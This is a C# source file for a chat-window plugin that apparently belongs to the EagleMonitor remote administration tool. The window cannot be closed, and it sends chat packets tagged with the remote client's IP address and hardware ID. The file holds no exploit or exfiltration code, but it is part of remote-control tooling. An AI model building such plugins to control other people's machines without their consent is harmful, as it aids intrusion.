using EagleMonitor.Controls;
using PacketLib.Packet;
using System;
using System.Drawing;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    class ChatForm : FormPattern
    {
        public ChatForm(string name) 
        {
            this.Name = name;
			this.Text = name;
			this.Load += new EventHandler(ChatForm_Load);
        }

		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && components != null)
				{
					components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

        internal RichTextBox msgRichTextBox;
        private Guna.UI2.WinForms.Guna2TextBox messageGuna2TextBox;
        private Guna.UI2.WinForms.Guna2Button sendMsgGuna2Button;
        private PictureBox pictureBox1;
        private System.ComponentModel.IContainer components;

		public void InitializeComponent()
		{
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ChatForm));
            this.msgRichTextBox = new System.Windows.Forms.RichTextBox();
            this.messageGuna2TextBox = new Guna.UI2.WinForms.Guna2TextBox();
            this.sendMsgGuna2Button = new Guna.UI2.WinForms.Guna2Button();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // msgRichTextBox
            // 
            this.msgRichTextBox.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.msgRichTextBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.msgRichTextBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.msgRichTextBox.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.msgRichTextBox.Location = new System.Drawing.Point(6, 104);
            this.msgRichTextBox.Name = "msgRichTextBox";
            this.msgRichTextBox.ReadOnly = true;
            this.msgRichTextBox.Size = new System.Drawing.Size(639, 287);
            this.msgRichTextBox.TabIndex = 12;
            this.msgRichTextBox.Text = "";
            // 
            // messageGuna2TextBox
            // 
            this.messageGuna2TextBox.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
            this.messageGuna2TextBox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.messageGuna2TextBox.DefaultText = "Hello !";
            this.messageGuna2TextBox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.messageGuna2TextBox.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.messageGuna2TextBox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.messageGuna2TextBox.DisabledState.Parent = this.messageGuna2TextBox;
            this.messageGuna2TextBox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.messageGuna2TextBox.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.messageGuna2TextBox.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.messageGuna2TextBox.FocusedState.Parent = this.messageGuna2TextBox;
            this.messageGuna2TextBox.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.messageGuna2TextBox.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
            this.messageGuna2TextBox.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.messageGuna2TextBox.HoverState.Parent = this.messageGuna2TextBox;
            this.messageGuna2TextBox.Location = new System.Drawing.Point(6, 73);
            this.messageGuna2TextBox.Name = "messageGuna2TextBox";
            this.messageGuna2TextBox.PasswordChar = '\0';
            this.messageGuna2TextBox.PlaceholderText = "Message...";
            this.messageGuna2TextBox.SelectedText = "";
            this.messageGuna2TextBox.SelectionStart = 7;
            this.messageGuna2TextBox.ShadowDecoration.Parent = this.messageGuna2TextBox;
            this.messageGuna2TextBox.Size = new System.Drawing.Size(639, 25);
            this.messageGuna2TextBox.TabIndex = 15;
            // 
            // sendMsgGuna2Button
            // 
            this.sendMsgGuna2Button.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.sendMsgGuna2Button.Animated = true;
            this.sendMsgGuna2Button.CheckedState.Parent = this.sendMsgGuna2Button;
            this.sendMsgGuna2Button.CustomImages.Parent = this.sendMsgGuna2Button;
            this.sendMsgGuna2Button.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.sendMsgGuna2Button.ForeColor = System.Drawing.Color.White;
            this.sendMsgGuna2Button.HoverState.Parent = this.sendMsgGuna2Button;
            this.sendMsgGuna2Button.Location = new System.Drawing.Point(6, 35);
            this.sendMsgGuna2Button.Name = "sendMsgGuna2Button";
            this.sendMsgGuna2Button.ShadowDecoration.Enabled = true;
            this.sendMsgGuna2Button.ShadowDecoration.Parent = this.sendMsgGuna2Button;
            this.sendMsgGuna2Button.Size = new System.Drawing.Size(639, 32);
            this.sendMsgGuna2Button.TabIndex = 14;
            this.sendMsgGuna2Button.Text = "Send message";
            this.sendMsgGuna2Button.Click += new System.EventHandler(this.sendMsgGuna2Button_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = global::Plugin.Properties.Resources.eagle2;
            this.pictureBox1.Location = new System.Drawing.Point(3, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(32, 32);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 16;
            this.pictureBox1.TabStop = false;
            // 
            // ChatForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
            this.ClientSize = new System.Drawing.Size(651, 397);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.messageGuna2TextBox);
            this.Controls.Add(this.sendMsgGuna2Button);
            this.Controls.Add(this.msgRichTextBox);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Name = "ChatForm";
            this.Padding = new System.Windows.Forms.Padding(3, 32, 3, 3);
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Load += new System.EventHandler(this.ChatForm_Load);
            this.Shown += new System.EventHandler(this.ChatForm_Shown);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

		}

        private void ChatForm_Load(object sender, EventArgs e)
        {
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                const int CS_NOCLOSE = 0x200;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }

        private void ChatForm_Shown(object sender, EventArgs e)
        {
            this.msgRichTextBox.SelectionColor = Color.FromArgb(66, 182, 245);
            this.msgRichTextBox.AppendText("You : Connected !" + "\n");

            RemoteChatPacket chatPacket = new RemoteChatPacket("User : Connected !" + "\n");
            chatPacket.BaseIp = Launch.clientHandler.baseIp;
            chatPacket.HWID = Launch.clientHandler.HWID;
            this.msgRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
            Launch.clientHandler.SendPacket(chatPacket);
        }

        private void sendMsgGuna2Button_Click(object sender, EventArgs e)
        {
            this.msgRichTextBox.SelectionColor = Color.FromArgb(66, 182, 245);
            this.msgRichTextBox.AppendText($"You : {messageGuna2TextBox.Text}" + "\n");
            RemoteChatPacket chatPacket = new RemoteChatPacket($"User : {messageGuna2TextBox.Text}" + "\n");
            chatPacket.BaseIp = Launch.clientHandler.baseIp;
            chatPacket.HWID = Launch.clientHandler.HWID;
            this.msgRichTextBox.SelectionColor = Color.FromArgb(197, 66, 245);
            Launch.clientHandler.SendPacket(chatPacket);
        }
    }
}
